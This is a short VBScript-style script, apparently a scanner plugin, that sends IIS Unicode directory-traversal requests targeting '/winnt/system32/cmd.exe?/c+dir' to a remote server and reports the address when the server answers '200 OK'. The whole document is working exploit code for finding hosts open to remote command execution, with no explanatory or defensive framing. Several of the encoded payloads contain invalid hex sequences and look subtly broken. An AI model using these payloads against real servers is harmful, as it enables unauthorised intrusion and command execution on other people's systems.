on error resume next
function Main
  iExploit = 0
  Socket.WriteString(ExploitString("/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir"))
  Socket.WriteString(ExploitString("/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir"))
  do while Socket.Connected
    sText = Socket.ReadString
    if InStr(sText, "200 OK") > 1 then
      MsgBox(Socket.RemoteAddress)
      Socket.Close
      exit function
    end if
  loop
  MsgBox("Connection Lost")
end function

function ExploitString(Exploit)
  ExploitString = "GET " & Exploit & " HTTP/1.0" & vbCrLf & "Keep-Alive: timeout=15, max=100" & vbCrLf & "Connection: Keep-Alive" & vbCrLf & vbCrLf
end function